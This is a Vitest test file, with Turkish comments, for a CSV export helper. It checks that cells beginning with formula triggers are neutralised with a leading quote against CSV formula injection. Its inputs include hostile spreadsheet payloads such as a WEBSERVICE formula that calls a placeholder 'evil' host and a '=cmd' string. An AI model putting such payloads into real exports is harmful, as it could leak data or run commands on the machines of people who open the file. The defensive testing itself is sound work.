import { describe, expect, it } from "vitest";

import { toCsv } from "@/lib/reports/csv";

// CSV formül enjeksiyonu (CWE-1236) koruması
describe("toCsv formül enjeksiyonu nötrleştirme", () => {
  it.each([
    "=WEBSERVICE(\"http://evil/x\")",
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
  ])("formül tetikleyiciyle başlayan hücreyi tek tırnakla nötrleştirir: %s", (payload) => {
    const csv = toCsv(["Ad"], [[payload]]);
    // BOM + başlık + satır; veri satırı ' ile başlamalı (gerekiyorsa tırnaklı)
    const dataLine = csv.split("\r\n")[1]!;
    expect(dataLine.startsWith("'") || dataLine.startsWith('"\'')).toBe(true);
  });

  it("zararsız değerleri değiştirmez", () => {
    const csv = toCsv(["Ad"], [["Ayşe Yılmaz"]]);
    expect(csv.split("\r\n")[1]).toBe("Ayşe Yılmaz");
  });

  it("formül + ayraç içeren değeri hem nötrleştirir hem RFC-4180 tırnaklar", () => {
    const csv = toCsv(["Ad"], [["=cmd,payload"]]);
    expect(csv.split("\r\n")[1]).toBe('"\'=cmd,payload"');
  });
});
